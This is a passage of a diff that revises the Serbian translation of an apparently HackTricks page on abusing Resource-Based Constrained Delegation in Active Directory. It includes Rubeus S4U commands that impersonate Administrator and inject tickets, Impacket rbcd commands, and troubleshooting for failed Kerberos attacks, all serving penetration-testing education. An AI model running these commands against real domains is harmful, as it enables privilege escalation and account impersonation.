+Poslednja komandna linija će izvršiti **celokupan S4U napad i ubaciti TGS** od Administratora ka žrtvinom hostu u **memoriju**.\
+U ovom primeru je zatražen TGS za uslugu **CIFS** od Administratora, tako da ćete moći da pristupite **C$**:
 
 ```bash
 ls \\victim.domain.local\C$
 ```
 
-### Zloupotreba različitih service tickets
+### Zloupotreba različitih servisnih tiketa
 
-Saznajte više o [**dostupnim service ticket-ovima ovde**](silver-ticket.md#available-services).
+Saznajte više o [**dostupnim servisnim tiketima ovde**](silver-ticket.md#available-services).
 
-## Enumerisanje, revizija i čišćenje
+## Enumeracija, revizija i čišćenje
 
-### Enumerisanje računara sa konfigurisanom RBCD
+### Enumeracija računara sa konfigurisanom opcijom RBCD
 
 PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):
 
@@ -322,7 +322,7 @@ Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
   }
 ```
 
-Impacket (čitajte ili ispraznite jednom komandom):
+Impacket (pročitajte ili ispraznite jednom komandom):
 
 ```bash
 # Read who can delegate to VICTIM
@@ -350,51 +350,51 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 ## Kerberos greške
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je Kerberos konfigurisan tako da ne koristi DES ni RC4, a vi navodite samo RC4 hash. Navedite Rubeus-u bar AES256 hash (ili mu navedite RC4, AES128 i AES256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji korak** koristeći **`S4U2Self+U2U`** umesto uobičajenog `S4U2Self`.<sup>[[10]](#references)</sup>
-- **`KDC_ERR_ETYPE_NOSUPP`** tokom **RBCD bez SPN-a**: noviji DC-ovi mogu da odbiju prinudni **RC4-HMAC** put koji zahteva trik `S4U2Self+U2U` + zamena session key-a. Umesto toga, isprobajte klasičan RBCD put sa **SPN-om** i AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
-- **`KRB_AP_ERR_SKEW`**: To znači da je vreme na trenutnom računaru različito od vremena na DC-u i da Kerberos ne radi ispravno.
-- **`preauth_failed`**: To znači da navedeno korisničko ime i hash-evi ne omogućavaju prijavu. Možda ste zaboravili da stavite „$“ u korisničko ime prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-- **`KDC_ERR_BADOPTION`**: Ovo može da znači:
-  - Korisnik kog pokušavate da lažno predstavite ne može da pristupi željenoj usluzi (jer ne možete da ga lažno predstavljate ili nema dovoljne privilegije).
-  - Tražena usluga ne postoji (ako zatražite ticket za WinRM, a WinRM nije pokrenut).
+- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je Kerberos konfigurisan tako da ne koristi DES ni RC4, a prosleđujete samo RC4 hash. Prosledite Rubeus-u bar AES256 hash (ili mu prosledite RC4, AES128 i AES256 hashove). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji hop** koristeći **`S4U2Self+U2U`** umesto običnog `S4U2Self`.<sup>[[10]](#references)</sup>
+- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu da odbiju forsirani **RC4-HMAC** put koji zahteva trik `S4U2Self+U2U` + zamena session key-a. Umesto toga pokušajte klasični **SPN-backed** RBCD put sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
+- **`KRB_AP_ERR_SKEW`**: To znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da Kerberos ne radi ispravno.
+- **`preauth_failed`**: To znači da navedeno korisničko ime i hashovi ne rade za prijavu. Možno je da ste zaboravili da dodate "$" korisničkom imenu prilikom generisanja hashova (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`KDC_ERR_BADOPTION`**: To може да значи:
+  - Korisnik kog pokušavate da imitirate ne može da pristupi željenoj usluzi (jer ne možete da ga imitirate ili nema dovoljno privilegija)
+  - Tražena usluga ne postoji (ako tražite ticket za winrm, a winrm nije pokrenut)
   - Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate ponovo da mu ih dodelite.
-  - Zloupotrebljavate klasični KCD; imajte na umu da RBCD radi sa `S4U2Self` ticket-ima koji nisu forwardable, dok KCD zahteva forwardable ticket-e.
+  - Zloupotrebljavate klasični KCD; imajte na umu da RBCD radi sa ne-forwardable S4U2Self ticketima, dok KCD zahteva forwardable.
 
-## Napomene, relayi i alternative
+## Napomene, relay-i i alternative
 
-- RBCD SD možete da upišete i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:
+- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:
 
 
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Kerberos relay lanci se često završavaju sa RBCD-om kako bi se lokalni SYSTEM dobio u jednom koraku. Pogledajte praktične primere od početka do kraja:
+- Kerberos relay lanci se često završavaju RBCD-om kako bi se lokalni SYSTEM dobio u jednom koraku. Pogledajte praktične primere od početka do kraja:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate nalog računara, alati kao što je **KrbRelayUp** mogu da relay-uju iznuđenu Kerberos autentifikaciju ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš nalog računara na objektu ciljnog računara i odmah lažno predstave **Administrator** preko S4U-a sa računara van hosta.<sup>[[8]](#references)</sup>
+- Ako su LDAP signing/channel binding **onemogućeni** i možete da kreirate nalog računara, alati poput **KrbRelayUp** mogu da relay-uju prisiljenu Kerberos autentifikaciju ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš nalog računara na objektu ciljnog računara i odmah imitiraju **Administrator** preko S4U-a sa računara koji nije deo domena.<sup>[[8]](#references)</sup>
 
 ## References
 
-- [1] [Mašući psom: zloupotreba delegiranja sa ograničenjima zasnovanog na resursima za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
-- [2] [Još jedna reč o delegiranju – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
-- [3] [Kerberos delegiranje sa ograničenjima zasnovano na resursima: preuzimanje objekta računara](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
-- [4] [Netwrix – zloupotreba delegiranja sa ograničenjima zasnovanog na resursima](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
-- [5] [Kerberosity je uništio domen: pregled ofanzivnog Kerberos-a](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-- [6] [Impacket rbcd.py (zvanično)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
-- [7] [Kratak Linux podsetnik sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
+- [1] [Mašenje repom: zloupotreba Resource-Based Constrained Delegation za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
+- [2] [Još nešto o delegiranju – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
+- [3] [Kerberos Resource-based Constrained Delegation: preuzimanje objekta računara](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
+- [4] [Netwrix – zloupotreba Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
+- [5] [Kerberosity je srušio domen: pregled ofanzivnog Kerberosa](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- [6] [Impacket rbcd.py (zvanični)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
+- [7] [Kratka Linux podsetnica sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
 - [8] [0xdf – HTB Bruno (LDAP signing isključen → Kerberos relay ka RBCD-u)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 - [9] [Synacktiv - istraživanje RBCD-a između domena i šuma](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
 - [10] [Synacktiv - istraživanje RBCD-a između domena i šuma: drugi deo](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
-- [11] [Impacket grana Synacktiv-a - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
-- [12] [Microsoft Learn - pregled Kerberos delegiranja sa ograničenjima](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [11] [Synacktiv Impacket grana - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
+- [12] [Microsoft Learn - pregled Kerberos constrained delegation-a](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
 - [13] [Microsoft Open Specifications - S4U2Self između domena](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
 - [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
-- [15] [Microsoft Learn - otkrivanje i otklanjanje upotrebe RC4 u Kerberos-u](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
+- [15] [Microsoft Learn - otkrivanje i otklanjanje upotrebe RC4 u Kerberosu](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
 - [16] [Microsoft Open Specifications – detalji o S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
 {{#include ../../banners/hacktricks-training.md}}
